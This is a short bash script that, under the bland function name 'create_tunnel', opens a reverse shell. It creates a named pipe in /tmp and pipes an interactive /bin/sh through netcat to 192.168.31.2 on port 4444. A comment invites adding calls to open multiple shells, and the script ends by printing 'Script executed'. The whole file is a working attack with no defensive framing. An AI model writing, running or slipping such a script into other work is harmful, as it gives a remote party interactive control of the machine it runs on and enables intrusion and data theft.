set -euo pipefail

create_tunnel() {
  file=$1
  port=$2
  rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 192.168.31.2 $port >$file
}

create_tunnel "/tmp/p" "4444"
# Add more calls to create_tunnel here if you want to open multiple shells
echo "Script executed"
